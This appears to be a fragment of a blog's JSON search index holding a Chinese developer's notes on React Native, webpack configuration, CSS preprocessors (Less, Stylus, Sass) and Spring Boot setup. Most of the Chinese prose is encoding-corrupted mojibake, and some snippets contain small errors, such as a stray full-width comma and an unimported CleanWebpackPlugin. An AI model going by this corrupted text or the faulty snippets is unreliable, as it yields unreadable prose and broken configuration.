ä¼¼ä¹æ˜¯å®˜æ–¹æ¨èçš„è§£å†³æ–¹æ¡ˆï¼Œä¸‹é¢ç»™å‡ºçš„æ˜¯1.xç‰ˆæœ¬çš„å†™æ³•ï¼Œç›®å‰(2020å¹´)å·²ç»å‡ºåˆ°5.Xç‰ˆæœ¬äº†ã€‚ğŸ¤®Navigator is deprecated,use stack navigator import React from &#39;react&#39;; import { View, Text } from &#39;react-native&#39;; import { StackNavigator } from &#39;react-navigation&#39;; // 1.0.0-beta.27 class HomeScreen extends React.Component { render() { return ( &lt;View style={{ flex: 1, alignItems: 'center', justifyContent: 'center' }}&gt; &lt;Text&gt;Home Screen&lt;/Text&gt; &lt;/View&gt; ); } } class DetailsScreen extends React.Component { render() { return ( &lt;View style={{ flex: 1, alignItems: 'center', justifyContent: 'center' }}&gt; &lt;Text&gt;Details Screen&lt;/Text&gt; &lt;/View&gt; ); } } const RootStack = StackNavigator( { Home: { screen: HomeScreen, }, Details: { screen: DetailsScreen, }, }, { initialRouteName: &#39;Home&#39;, } ); export default class App extends React.Component { render() { return &lt;RootStack /&gt;; } } æ—¢ç„¶æœ‰è·¯ç”±å°±ä¸å…è°ˆåˆ°å„ä¸ªç»„ä»¶ä¹‹é—´çš„å†™æ³•æ˜¾ç„¶ï¼Œä½ å¯ä»¥å°†LogoTitleå†™åˆ°å¦ä¸€ä¸ªæ–‡ä»¶ä¸­å»ï¼Œç„¶åexport defaultï¼Œå†importå‡ºæ¥ã€‚ä¸‹é¢è¿™ç§åªæ˜¯ä¸ºäº†è¯´æ˜ä½ èƒ½è¿™æ ·å†™ï¼Œä¸€ä¸ªå¾ˆç®€å•çš„å°åŠŸèƒ½å¯ä»¥æ”¾åœ¨å†…éƒ¨ä½œä¸ºä¸€ä¸ªclassè‡ªå·±ä½¿ç”¨ã€‚ class LogoTitle extends React.Component { render() { return ( &lt;Image source={require(&#39;./spiro.png&#39;)} style={{ width: 30, height: 30 }} /&gt; ); } } class HomeScreen extends React.Component { static navigationOptions = { // headerTitle instead of title headerTitle: &lt;LogoTitle /&gt;, }; /* render function, etc */ } styling&lt;View style={{ height:30, backgroundColor:'purple', justifyContent:'center', alignItems:'center', flexDirection:'row', alignContent:'flex-start' }}&gt; &lt;Text style={{ color: 'white', backgroundColor: 'red', }}&gt; This Text will be centered both horizontally and vertically &lt;/Text&gt; &lt;/View&gt; viewçš„propsä¸­,trueè¦è¿™ä¹ˆå†™ Textæ–‡å­—å±…ä¸­çš„æ–¹å¼æ˜¯è®¾ç½®alignSelf:center ç±»ä¼¼äºLinearLayout horizontal ,1ï¼š3ç­‰åˆ†ä¸¤ä¸ªViewçš„æ–¹å¼å¯ä»¥è¿™ä¹ˆå†™ &lt;View style={{flexDirection:'row'}}&gt; &lt;Text style={{flex:1}}&gt; occupy 25% width &lt;/Text&gt; &lt;Text style={{flex:3}}&gt; occupy 75% width &lt;/Text&gt; &lt;/View&gt; Imageæ”¯æŒåœ†è§’ï¼Œä¾‹å¦‚ borderTopRightRadiusimageï¼Œè¿™ä¸ªæ˜¯Imageæ§ä»¶çš„æ–‡æ¡£ä¸‹é¢è¿™ä¸ªæ˜¯åœ†å½¢çš„Image &lt;Image style={{ alignSelf: 'center', height: 150, width: 150, borderWidth: 1, borderRadius: 75 }} source={{uri:'https://facebook.github.io/react/img/logo_og.png'}} resizeMode=&quot;cover&quot; /&gt; imagesï¼Œè¿™ä¸ªæ˜¯Imageæ•°æ®æºçš„æ–‡æ¡£å¤§è‡´æ„æ€æ˜¯ç½‘ç»œå›¾ç‰‡éœ€è¦æ‰‹åŠ¨è®¾ç½®å®½é«˜ï¼Œassetsæ–‡ä»¶åˆ™ä¸éœ€è¦ã€‚å› ä¸ºrequire(./avatar.png)çš„è¿”å›å€¼å°†ä¼šè‡ªåŠ¨å¸¦ä¸Šå›¾ç‰‡çš„å°ºå¯¸ä¿¡æ¯ It is more work for the developer to know the dimensions (or aspect ratio) of the remote image in advance, but we believe that it leads to a better user experience. Static images loaded from the app bundle via the require(&#39;./my-icon.png&#39;) syntax can be automatically sized because their dimensions are available immediately at the time of mounting. SectionListè‡ªå¸¦stickyHeaderï¼Œå¹¶ä¸”å…¶æ•°æ®ç»“æ„æ˜¯è¿™æ ·çš„ const DATA = [ { title: &#39;Main dishes&#39;, data: [&#39;Pizza&#39;, &#39;Burger&#39;, &#39;Risotto&#39;], }, { title: &#39;Sides&#39;, data: [&#39;French Fries&#39;, &#39;Onion Rings&#39;, &#39;Fried Shrimps&#39;], }, { title: &#39;Drinks&#39;, data: [&#39;Water&#39;, &#39;Coke&#39;, &#39;Beer&#39;], }, { title: &#39;Desserts&#39;, data: [&#39;Cheese Cake&#39;, &#39;Ice Cream&#39;], }, ]; ComponentsAndroidå¹³å°ä¸€ä¸ªScrollViewåªèƒ½æœ‰ä¸€ä¸ªChildView(Node)ï¼Œåœ¨react-nativeä¸Šä¼¼ä¹æ²¡æœ‰è¿™æ ·çš„é™åˆ¶ Buttonæ˜¯ä¸€ä¸ªæ²¡ä»€ä¹ˆå¤§ç”¨å¤„çš„æ§ä»¶ï¼Œä¸€èˆ¬ç”¨TouchableOpacityåŒ…ä¸€å±‚textå»å®ç°Buttonç»„ä»¶çš„stylingä»…é™äºå‡ ä¸ªå±æ€§ï¼Œå¯ä»¥ç”¨TouchableXXXæ¥ä»£æ›¿ The React Native Button is very limited in what you can do, see; Button It does not have a style prop, and you don&#39;t set text the &quot;web-way&quot; like &lt;Button&gt;txt&lt;/Button&gt; but via the title property &lt;Button title=&quot;txt&quot; /&gt; If you want to have more control over the appearance you should use one of the TouchableXXXX&#39; components like TouchableOpacity They are really easy to use :-) åœ¨jsxé‡Œé¢å†™ä¸‰å…ƒè¡¨è¾¾å¼ä¹Ÿæ˜¯å¯ä»¥çš„ &lt;View style={{paddingTop: Platform.OS === 'android' ? 0 : 20}}&gt; &lt;/View&gt; çŠ¶æ€æ é—®é¢˜å°¤å…¶æ˜¯åœ¨iphone Xä¸Šï¼Œå¦‚ä½•è®¾ç½®notché‚£ä¸€å—ä½ç½®çš„é¢œè‰²iOS doesnâ€™t have a concept of a status bar bg è§¦æ§äº‹ä»¶å¤„ç†å¦‚ä½•å¤„ç†touch event react nativeæŠŠè¿™ä¸ªç§°ä¹‹ä¸ºgesture PropTypesç”¨äºå®šä¹‰ä¸€ä¸ªComponentçš„props import PropTypes from â€˜prop-typesâ€™; // ä¸»è¦æ˜¯ä¸ºäº†ç±»å‹æ£€æŸ¥å§ ä¾‹å¦‚PropTypes.oneOfType ç›´æ¥æ“ä½œæŸä¸ªelementä¹Ÿä¸æ˜¯æ²¡æœ‰refså¯ä»¥ç”¨æ¥è·å–æŸä¸ªelementï¼Œç›´æ¥æ“ä½œï¼Œä¾‹å¦‚measure cloneElement() isValidElement() React.Children ä¸‹æ‹‰åˆ·æ–°å¯ä»¥ä½¿ç”¨refreshControlå¾…å¡«å‘async storage camera Roll React.FunctionComponent react hooksçš„å‡ºç°æ˜¯ä¸ºäº†æ›¿ä»£ä¸€äº›åµŒå¥—å¾—è¿‡æ·±çš„é«˜é˜¶ç»„ä»¶ã€‚hooksé‡Œé¢ä¹Ÿæœ‰ä¸€ä¸ªstoreï¼Œæ¨èå»çœ‹ä¸€ä¸‹react-reduxçš„æºç ã€‚åº”è¯¥æœ‰å…¼å®¹class componentå’Œfunctional componentçš„å†™æ³•ã€‚ ReactNativeä¹‹jsä¸nativeé€šä¿¡æµç¨‹ï¼ˆAndroidç¯‡ï¼‰ReactNativeä¹‹VirtualDomTreeçš„diffåŸç†åŸºäºReact Nativeæ„å»ºçš„ä»¿äº¬ä¸œå®¢æˆ·ç«¯","tags":[{"name":"å‰ç«¯","slug":"å‰ç«¯","permalink":"https://haldir65.github.io/tags/å‰ç«¯/"}]},{"title":"Webpackèµ„æºæ±‡æ€»","date":"2018-01-14T22:56:46.000Z","path":"2018/01/14/2018-01-14-webpack-instructions/","text":"ä½¿ç”¨webpackçš„ä¸€ä¸ªå¥½å¤„æ˜¯ï¼Œæµè§ˆå™¨çš„å¹¶å‘è¯·æ±‚èµ„æºæ•°æ˜¯æœ‰ä¸€ä¸ªä¸Šé™çš„ï¼ŒæŠŠæ‰€æœ‰èµ„æºæ‰“æˆä¸€ä¸ªåŒ…ï¼Œèƒ½å¤Ÿå‡å°‘è¯·æ±‚æ•°é‡ã€‚webpackæ›´æ–°çš„é€Ÿåº¦æ˜¯çœŸå¿«ï¼Œç›®å‰(2019å¹´4æœˆæœ€æ–°ç‰ˆæœ¬å·²ç»åˆ°4.30.0) 1.å®‰è£… yarn add webpack â€“dev 2.ä½¿ç”¨ webpack is basically pulling all external js files into on build.js file that we can bundle into our html.è¿™æ ·åšçš„å¥½å¤„æ˜¯ï¼Œèƒ½å¤Ÿæœ‰æ•ˆå‡å°‘æµè§ˆå™¨å‘å‡ºçš„è¯·æ±‚æ•°é‡ã€‚ webpack -på³å¯ 3. webpack.config.jsä»webpack-examplecopyä¸€ä¸ªwebpack.config.jsè¿‡æ¥ï¼ŒåŸºæœ¬å¯ä»¥æå®šes6,less,hot-reload,css-pluginè¿˜æœ‰assetæ–‡ä»¶copyè¿™äº›å¸¸è§çš„éœ€æ±‚ã€‚é¦–å…ˆæ˜¯package.json { &quot;name&quot;: &quot;Web&quot;, &quot;version&quot;: &quot;1.0.0&quot;, &quot;description&quot;: &quot;[webpack4, babel7,react 16](https://medium.freecodecamp.org/how-to-use-reactjs-with-webpack-4-babel-7-and-material-design-ff754586f618)&quot;, &quot;main&quot;: &quot;index.js&quot;, &quot;scripts&quot;: { &quot;test&quot;: &quot;echo \\&quot;Error: no test specified\\&quot; &amp;&amp; exit 1&quot;, &quot;webpack&quot;: &quot;babel-node ./node_modules/webpack/bin/webpack&quot;, &quot;start&quot;: &quot;babel-node ./node_modules/webpack-dev-server/bin/webpack-dev-server --open&quot; }, &quot;repository&quot;: { &quot;type&quot;: &quot;git&quot;, &quot;url&quot;: &quot;git+https://github.com/Haldir65/Web.git&quot; }, &quot;keywords&quot;: [], &quot;author&quot;: &quot;&quot;, &quot;license&quot;: &quot;ISC&quot;, &quot;bugs&quot;: { &quot;url&quot;: &quot;https://github.com/Haldir65/Web/issues&quot; }, &quot;homepage&quot;: &quot;https://github.com/Haldir65/Web#readme&quot;, &quot;devDependencies&quot;: { &quot;@babel/core&quot;: &quot;^7.4.3&quot;, &quot;@babel/node&quot;: &quot;^7.2.2&quot;, &quot;@babel/plugin-proposal-class-properties&quot;: &quot;^7.4.0&quot;, &quot;@babel/preset-env&quot;: &quot;^7.4.3&quot;, &quot;@babel/preset-react&quot;: &quot;^7.0.0&quot;, &quot;babel-loader&quot;: &quot;^8.0.5&quot;, &quot;css-loader&quot;: &quot;^2.1.1&quot;, &quot;file-loader&quot;: &quot;^3.0.1&quot;, &quot;html-webpack-plugin&quot;: &quot;^3.2.0&quot;, &quot;node-sass&quot;: &quot;^4.11.0&quot;, &quot;path&quot;: &quot;^0.12.7&quot;, &quot;sass-loader&quot;: &quot;^7.1.0&quot;, &quot;style-loader&quot;: &quot;^0.23.1&quot;, &quot;webpack&quot;: &quot;^4.30.0&quot;, &quot;webpack-cli&quot;: &quot;^3.3.0&quot;, &quot;webpack-dev-server&quot;: &quot;^3.3.1&quot; }, &quot;dependencies&quot;: { &quot;react&quot;: &quot;^16.8.6&quot;, &quot;react-dom&quot;: &quot;^16.8.6&quot; } } webpack.config.js const path = require(&#39;path&#39;); const webpack = require(&#39;webpack&#39;); //å¼•å…¥çš„webpack,ä½¿ç”¨lodash const HtmlWebpackPlugin = require(&#39;html-webpack-plugin&#39;) //å°†htmlæ‰“åŒ… const ExtractTextPlugin = require(&#39;extract-text-webpack-plugin&#39;) //æ‰“åŒ…çš„cssæ‹†åˆ†,å°†ä¸€éƒ¨åˆ†æŠ½ç¦»å‡ºæ¥ const CopyWebpackPlugin = require(&#39;copy-webpack-plugin&#39;) // console.log(path.resolve(__dirname,&#39;dist&#39;)); //ç‰©ç†åœ°å€æ‹¼æ¥ module.exports = { entry: &#39;./src/index.js&#39;, //å…¥å£æ–‡ä»¶ åœ¨vue-cli main.js output: { //webpackå¦‚ä½•è¾“å‡º path: path.resolve(__dirname, &#39;dist&#39;), //å®šä½ï¼Œè¾“å‡ºæ–‡ä»¶çš„ç›®æ ‡è·¯å¾„ filename: &#39;[name].js&#39; //é»˜è®¤ç”Ÿæˆçš„æ˜¯main.js }, module: { //æ¨¡å—çš„ç›¸å…³é…ç½® rules: [ //æ ¹æ®æ–‡ä»¶çš„åç¼€æä¾›ä¸€ä¸ªloader,è§£æè§„åˆ™ { test: /\\.js$/, //es6 =&gt; es5 include: [ path.resolve(__dirname, &#39;src&#39;) ], // exclude:[], ä¸åŒ¹é…é€‰é¡¹ï¼ˆä¼˜å…ˆçº§é«˜äºtestå’Œincludeï¼‰ use: &#39;babel-loader&#39; }, { test: /\\.css/, use: ExtractTextPlugin.extract({ fallback: &#39;style-loader&#39;, use: [ &#39;css-loader&#39; ] }) }, { test: /\\.less$/, use: ExtractTextPlugin.extract({ fallback: &#39;style-loader&#39;, use: [ &#39;css-loader&#39;, &#39;less-loader&#39; ] }) }, { //å›¾ç‰‡loader test: /\\.(png|jpg|gif)$/, use: [ { loader: &#39;file-loader&#39; //æ ¹æ®æ–‡ä»¶åœ°å€åŠ è½½æ–‡ä»¶ } ] } ] }, resolve: { //è§£ææ¨¡å—çš„å¯é€‰é¡¹ // modules: [ ]//æ¨¡å—çš„æŸ¥æ‰¾ç›®å½• é…ç½®å…¶ä»–çš„cssç­‰æ–‡ä»¶ extensions: [&quot;.js&quot;, &quot;.json&quot;, &quot;.jsx&quot;,&quot;.less&quot;, &quot;.css&quot;], //ç”¨åˆ°æ–‡ä»¶çš„æ‰©å±•å alias: { //æ¨¡å—åˆ«ååˆ—è¡¨ utils: path.resolve(__dirname,&#39;src/utils&#39;) } }, plugins: [ //æ’è¿›çš„å¼•ç”¨, å‹ç¼©ï¼Œåˆ†ç¦»ç¾åŒ– new ExtractTextPlugin(&#39;[name].css&#39;), //[name] é»˜è®¤ ä¹Ÿå¯ä»¥è‡ªå®šä¹‰name å£°æ˜ä½¿ç”¨ new HtmlWebpackPlugin({ //å°†æ¨¡æ¿çš„å¤´éƒ¨å’Œå°¾éƒ¨æ·»åŠ csså’Œjsæ¨¡æ¿,dist ç›®å½•å‘å¸ƒåˆ°æœåŠ¡å™¨ä¸Šï¼Œé¡¹ç›®åŒ…ã€‚å¯ä»¥ç›´æ¥ä¸Šçº¿ file: &#39;index.html&#39;, //æ‰“é€ å•é¡µé¢è¿ç”¨ æœ€åè¿è¡Œçš„ä¸æ˜¯è¿™ä¸ª template: &#39;src/index.html&#39; //vue-cliæ”¾åœ¨æ ¹ç›®å½•ä¸‹ }), new CopyWebpackPlugin([ //srcä¸‹å…¶ä»–çš„æ–‡ä»¶ç›´æ¥å¤åˆ¶åˆ°distç›®å½•ä¸‹ { from:&#39;src/assets/favicon.ico&#39;,to: &#39;favicon.ico&#39; } ]), new webpack.ProvidePlugin({ //å¼•ç”¨æ¡†æ¶ jquery lodashå·¥å…·åº“æ˜¯å¾ˆå¤šç»„ä»¶ä¼šå¤ç”¨çš„ï¼Œçœå»äº†import &#39;_&#39;: &#39;lodash&#39; //å¼•ç”¨webpack })ï¼Œ new CleanWebpackPlugin() //è¿™ä¸ªæ˜¯ç”¨äºåˆ é™¤ä¸Šä¸€æ¬¡distæ–‡ä»¶å¤¹ä¸­ç”Ÿæˆçš„main.xxxx.jsè¿™äº›ä¹±ä¸ƒå…«ç³Ÿçš„æ–‡ä»¶çš„ ], devServer: { //æœåŠ¡äºwebpack-dev-server å†…éƒ¨å°è£…äº†ä¸€ä¸ªexpress port: &#39;1314&#39;, before(app) { app.get(&#39;/api/test.json&#39;, (req, res) =&gt; { res.json({ code: 200, message: &#39;Hello World&#39; }) }) } } } webpack devServer(å†…ç½®ä¸€ä¸ªexpressï¼Œåœ¨æœ¬åœ°èµ·ä¸€ä¸ªlocal server) yarn add webpack-dev-server webpack-dev-serverçš„ä»‹ç»é¡µæ˜¯è¿™ä¹ˆè¯´çš„ï¼š Use webpack with a development server that provides live reloading. This should be used for development only.It uses webpack-dev-middleware under the hood, which provides fast in-memory access to the webpack assets.å…³é”®æ˜¯çƒ­æ›´æ–°(è¿˜æœ‰dev-serveræä¾›çš„å†…å®¹ï¼Œæ¯”æ–¹è¯´htmlè¿™äº›ä¸œè¥¿æ˜¯æ”¾åœ¨å†…å­˜é‡Œé¢çš„ï¼Œä¸å­˜åœ¨å®é™…ä¸Šçš„æ–‡ä»¶) ä½†æ˜¯devServer çš„hot reload åªèƒ½ç›‘è§†jsæ–‡ä»¶çš„å˜åŒ–ï¼Œå¹¶ä¸èƒ½ç›‘è§†htmlæˆ–è€…server contentçš„å˜åŒ–ã€‚è¿™éœ€è¦browserSyncä»¥åŠBrowserSync plugin for Webpack. yarn add browsersync browser-sync-webpack-plugin HtmlWebpackPluginç›®å‰å·²ç»å¯ä»¥åšåˆ°å’Œwebpack-dev-serveræ­é…å®ç°html hot reloadæœ‰äº†HtmlWebpackPlugin,htmlæ–‡ä»¶é‡Œé¢å·²ç»ä¸éœ€è¦å†™scriptæˆ–è€…cssçš„tagäº†ã€‚ç›´æ¥åœ¨index.jsé‡Œé¢å»require(â€œ./styles/indexâ€)å°±è¡Œ 4. babel-loader(es6 -&gt; es5)babel-loaderæ˜¯webpackçš„ä¸€ä¸ªloaderï¼Œå¯ä»¥è½¬æ¢ES6ä»¥ä¸Šçš„ä»£ç åˆ°ES5babelçš„ä½œç”¨æ˜¯æŠŠes2015çš„ä»£ç ç¼–è¯‘æˆes5çš„ä»£ç , ä¸ºäº†ä½¿ç”¨babel-loaderæˆ‘ä»¬éœ€è¦å®‰è£…ä¸€ç³»åˆ—çš„ä¾èµ– yarn add babel-core babel-loader babel-preset-env â€“dev ç„¶ååˆ›å»ºä¸€ä¸ª.babelrcæ–‡ä»¶,åœ¨.babelrcé…ç½®æ–‡ä»¶ä¸­ï¼Œä¸»è¦æ˜¯å¯¹é¢„è®¾ï¼ˆpresetsï¼‰å’Œæ’ä»¶ï¼ˆpluginsï¼‰è¿›è¡Œé…ç½® { &quot;presets&quot;: [&quot;@babel/preset-env&quot;, &quot;@babel/preset-react&quot;] } è¦ä½¿ç”¨babel-loaderçš„è¯ï¼Œå°±åœ¨webpack.config.jsæ–‡ä»¶ä¸­æ·»åŠ  module.exports = { module: { rules: [ { test: /\\.js$/, exclude: /node_modules/, use: { loader: &quot;babel-loader&quot; } } ] } }; package.jsonä¸­ä¿®æ”¹script: &quot;scripts&quot;: { &quot;webpack&quot;: &quot;babel-node ./node_modules/webpack/bin/webpack&quot;, &quot;start&quot;: &quot;babel-node ./node_modules/webpack-dev-server/bin/webpack-dev-server --open&quot; } é¦–å…ˆç”Ÿæˆå¯¹åº”çš„bundleï¼Œåç»­å†ç”¨devServerå°†buildæ–‡ä»¶å¤¹ä¸­çš„å†…å®¹æ¸²æŸ“åˆ°æµè§ˆå™¨ 5. style-loaderå’Œcss-loaderä»¥react appä¸ºä¾‹ï¼Œ webpack.config.jsä¸­çš„loaderè¦è¿™ä¹ˆå†™ const HtmlWebPackPlugin = require(&quot;html-webpack-plugin&quot;); const htmlWebpackPlugin = new HtmlWebPackPlugin({ template: &quot;./src/index.html&quot;, filename: &quot;./index.html&quot; }); module.exports = { module: { rules: [ { test: /\\.js$/, exclude: /node_modules/, use: { loader: &quot;babel-loader&quot; } }, { test: /\\.css$/, use: [&quot;style-loader&quot;, &quot;css-loader&quot;] } ] }, plugins: [htmlWebpackPlugin] }; é¦–å…ˆè¦çŸ¥é“çš„æ˜¯webpackæ˜¯ä»å³å¾€å·¦apply loaderçš„ï¼Œ css-loaderçš„ä½œç”¨æ˜¯resolve é‚£äº›è¢«importåˆ°React Componentä¸­çš„cssæ–‡ä»¶ï¼Œä¸€æ—¦resolveå®Œæˆï¼Œstyle-loaderå°±ä¼šåœ¨ç”Ÿæˆçš„htmlæ–‡ä»¶å¤´éƒ¨æ·»åŠ ä¸€ä¸ª style çš„tagã€‚react app from scratch Deprecatedreact cli and vue cliåŸç†common front end javaScript librariesminify js(åˆ æ‰æ‰€æœ‰çš„ç©ºè¡Œ)underscore javaScript libraryhandlebars(æ¨¡æ¿) å‚è€ƒsimple webpack4 boilerplate webpack4å¥½ç”¨çš„templateWebpack 4 Tutorial: from 0 Conf to Production Mode","tags":[{"name":"å‰ç«¯","slug":"å‰ç«¯","permalink":"https://haldir65.github.io/tags/å‰ç«¯/"}]},{"title":"cssé¢„å¤„ç†è¯­è¨€","date":"2017-12-26T22:36:49.000Z","path":"2017/12/26/2017-12-26-less-is-more/","text":"cssé¢„å¤„ç†è¯­è¨€ç®€ä»‹ cssé¢„å¤„ç†è¯­è¨€å…è®¸æˆ‘ä»¬ä»¥æ›´ç®€å•çš„æ–¹å¼ç¼–å†™æ ·å¼ï¼Œé€šè¿‡ç¼–è¯‘ç”Ÿæˆæµè§ˆå™¨èƒ½å¤Ÿä½¿ç”¨çš„cssæ–‡ä»¶ã€‚ Sass è¯ç”Ÿäº 2007 å¹´ï¼ŒRuby ç¼–å†™ï¼Œå…¶è¯­æ³•åŠŸèƒ½éƒ½ååˆ†å…¨é¢ï¼Œå¯ä»¥è¯´ å®ƒå®Œå…¨æŠŠ CSS å˜æˆäº†ä¸€é—¨ç¼–ç¨‹è¯­è¨€ã€‚å¦å¤– åœ¨å›½å†…å¤–éƒ½å¾ˆå—æ¬¢è¿ï¼Œå¹¶ä¸”å®ƒçš„é¡¹ç›®å›¢é˜Ÿå¾ˆæ˜¯å¼ºå¤§ ï¼Œæ˜¯ä¸€æ¬¾ååˆ†ä¼˜ç§€çš„é¢„å¤„ç†è¯­è¨€ã€‚ Stylus è¯ç”Ÿäº 2010 å¹´ï¼Œæ¥è‡ª Node.js ç¤¾åŒºï¼Œè¯­æ³•åŠŸèƒ½ä¹Ÿå’Œ Sass ä¸ç›¸ä¼¯ä»²ï¼Œæ˜¯ä¸€é—¨ååˆ†ç‹¬ç‰¹çš„åˆ›æ–°å‹è¯­è¨€ã€‚ Less è¯ç”Ÿäº 2009 å¹´ï¼Œå—Sassçš„å½±å“åˆ›å»ºçš„ä¸€ä¸ªå¼€æºé¡¹ç›®ã€‚ å®ƒæ‰©å……äº† CSS è¯­è¨€ï¼Œå¢åŠ äº†è¯¸å¦‚å˜é‡ã€æ··åˆï¼ˆmixinï¼‰ã€å‡½æ•°ç­‰åŠŸèƒ½ï¼Œè®© CSS æ›´æ˜“ç»´æŠ¤ã€æ–¹ä¾¿åˆ¶ä½œä¸»é¢˜ã€æ‰©å……ï¼ˆå¼•ç”¨äºå®˜ç½‘ï¼‰ã€‚ æ¯”è¾ƒè¿™ä¸‰ç§é¢„å¤„ç†è¯­è¨€ 1. Less å®‰è£…yarn add less/ or install globally /yarn global add less// Dead Simple LESS CSS Watch Compilerï¼Œå®æ—¶ç›‘æ§lessæ–‡ä»¶å˜åŒ–ï¼Œæ›´æ–°åˆ°cssyarn add less-watch-compiler ä½¿ç”¨lessc styles.less // å¹¶ä¸ä¼šç”Ÿæˆä»»ä½•cssæ–‡ä»¶lessc styles.less styles.css //ç”Ÿæˆä¸€ä¸ªstyles.cssæ–‡ä»¶æ–°å»ºä¸€ä¸ªstyle.lessæ–‡ä»¶ @background-color: #f4f4f4; body { background-color: @background-color; } ç”Ÿæˆçš„cssæ–‡ä»¶é•¿è¿™æ ·ï¼š body { background-color: #f4f4f4; } //æœ‰å˜é‡ï¼Œå¯ä»¥è¿›è¡Œæ•°å­¦è¿ç®— @line-height: 1em+1em; //å¯ä»¥åµŒå¥— @secondary-color: #20B2AA; ul { background-color: @background-color; li { color: @secondary-color; a { line-height: @line-height; } } } // æœ‰ç»§æ‰¿ .btn { padding: 10px 15px; border: 0; .border-radius(10px); } .primary-btn:extend(.btn){ background: @primary-color; .text-color(@primary-color); } // æœ‰å‡½æ•°ï¼ˆmixinï¼‰ï¼Œæœ‰æ²¡æœ‰å…¥å‚éƒ½è¡Œ .bordered{ border-top: dotted 1px #000; border-bottom: solid2px #000; } .border-radius(@radius) { border-radius: @radius; } //è¿˜æœ‰if statement .text-color(@a) when (lightness(@a) &gt; = 50% ){ color: black; } .text-color(@a) when (lightness(@a) &lt; 50% ){ color: white; } filepathæ¯”å¦‚ç»å¸¸æŠŠä¸€äº›æ–‡ä»¶æŒªåˆ°å…¶ä»–ä½ç½®äº†ï¼Œè¿™ä¸‹åœ¨cssä¸­å¼•ç”¨çš„ä½ç½®å…¨éƒ¨éƒ½è¦æ¢ï¼Œ @images: &quot;images/&quot; @homepage-images: &quot;images/homepage/&quot; img { background: url(&quot;@{images}fruit.png&quot;); } importåŠŸèƒ½åœ¨main.lessæ–‡ä»¶ä¸­ @import header.less@import menu.lessç›´æ¥ç”¨ æ›´å¤šçš„ä½¿ç”¨ç›´æ¥å»LessæŸ¥æ‰¾å°±å¥½äº† lessæ­é…webpack(webpack-dev-serverä½¿ç”¨)ä½¿ç”¨æ–¹å¼deadsimple-less-watch-compiler â€” watch lesswebpack-dev-server â€“ watch js file changeswebpack-less-loader webpack.config.js module.exports = { module: { rules: [ { test: /\\.less$/, use: [ &#39;style-loader&#39;, { loader: &#39;css-loader&#39;, options: { importLoaders: 1 } }, &#39;less-loader&#39; ] } ] } } åœ¨index.jsä¸­: import css from â€˜styles.lessâ€™; æ‰¾äº†å¥½ä¹…æ²¡æœ‰æ‰¾åˆ°å…³äºless-loader hot reloadçš„è®¾ç½®ï¼Œåªå¥½åœ¨package.jsonä¸­è®¾ç½® â€œdevâ€: â€œless-watch-compilerâ€,â€œstartâ€:â€webpack-dev-server â€“progress â€“hot â€“inline â€“config webpack.config.js &amp;&amp; yarn devâ€ æŠŠä¸¤ä¸ªcommand chainèµ·æ¥å°±æ˜¯äº† 2.Stylus å®‰è£…yarn add stylusyarn add stylus-loader ä½¿ç”¨stylus -w style.styl -o style.css //wè¡¨ç¤ºwatch line-height = 10px body margin: 0 padding: 0 h1 color: #5e5e5e line-height: line-height ç”Ÿæˆçš„cssæ–‡ä»¶é•¿è¿™æ · body { margin: 0; padding: 0; } body h1 { color: #5e5e5e; line-height: 10px; } // mixinä¹Ÿæœ‰ border-radius(n) -webkit-border-radius n -moz-border-radius n border-radius n form input[type=button] border-radius(5px) å®˜ç½‘ å½“ç„¶æ—¥å¸¸å¼€å‘ä¸­ä¸å¯èƒ½ä¸€ç›´æ‰‹æ•² stylus xxx xxxæˆ–è€… lessc xxx xxxï¼Œå› ä¸ºæœ‰webpack-loaderã€‚ 3. SassSasséœ€è¦å®‰è£…Rubyã€‚SCSS æ˜¯ Sass 3 å¼•å…¥æ–°çš„è¯­æ³•ï¼Œå…¶è¯­æ³•å®Œå…¨å…¼å®¹ CSS3ï¼Œå¹¶ä¸”ç»§æ‰¿äº† Sass çš„å¼ºå¤§åŠŸèƒ½ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œä»»ä½•æ ‡å‡†çš„ CSS3 æ ·å¼è¡¨éƒ½æ˜¯å…·æœ‰ç›¸åŒè¯­ä¹‰çš„æœ‰æ•ˆçš„ SCSS æ–‡ä»¶ã€‚ @mixin rounded($amount) { -moz-border-radius: $amount; -webkit-border-radius: $amount; border-radius: $amount; } Sassæœ¬èº«ä¸å¸¦èŠ±æ‹¬å·ï¼ŒåŠ ä¸ŠèŠ±æ‹¬å·å’Œåˆ†å·å°±æˆäº†SCSSäº†.","tags":[{"name":"å‰ç«¯","slug":"å‰ç«¯","permalink":"https://haldir65.github.io/tags/å‰ç«¯/"}]},{"title":"Spring Bootå…¥é—¨è®°å½•","date":"2017-12-13T23:19:33.000Z","path":"2017/12/13/2017-12-13-spring-boot-elementary-guide/","text":"å…³äºSpring Bootçš„åŸºæœ¬çŸ¥è¯†è¦ç‚¹ 1. åˆ›å»ºä¸€ä¸ªSpring Boot app éå¸¸ç®€å•Creating a Spring Application in Intelij is darn Simple è„šæ‰‹æ¶è¿™ç§ä¸œè¥¿ä¹Ÿæ˜¯æœ‰çš„ 2. ç»„ä»¶åŠç”¨æ³•2.1 Service2.2 Daoh2 databaseçš„web consoleä¸­ï¼Œç”¨æˆ·åæ˜¯userï¼Œ å¯†ç è‡ªå·±åœ¨consoleä¸­æœç´¢ã€‚ä½¿ç”¨h2 databaseçš„å¥½å¤„æ˜¯memory dbï¼Œé€Ÿåº¦å¿«ï¼Œä¸ç”¨è£…mysqlï¼Œå¦‚æœéœ€è¦æŒä¹…åŒ–çš„è¯ï¼Œdburlåˆ¶å®šä¸€ä¸ªæœ¬åœ°æ–‡ä»¶å°±å¯ä»¥äº† 2.3 Entity2.4 Controller3. ä¸€äº›é…ç½®Spring Bootä¿®æ”¹å†…ç½®Tomcatç«¯å£å·ï¼šEmbeddedServletContainerCustomizer æˆ–è€…åœ¨src/main/resources/application.ymlæ–‡ä»¶ä¸­æ·»åŠ  server port: 8081 4. éƒ¨ç½²åˆ°linuxæœºå™¨ä¸Šå¦‚ä½•éƒ¨ç½²springBoot application Deploying in Java Archive (JAR) as a standalone applicationï¼ˆæ‰“æˆä¸€ä¸ªjaråŒ…ï¼‰åœ¨pom.xmlä¸­æ·»åŠ è¿™ä¹ˆä¸€æ®µ &lt;build&gt; &lt;plugins&gt; &lt;plugin&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-maven-plugin&lt;/artifactId&gt; &lt;/plugin&gt; &lt;/plugins&gt; &lt;/build&gt; éšåmvn package 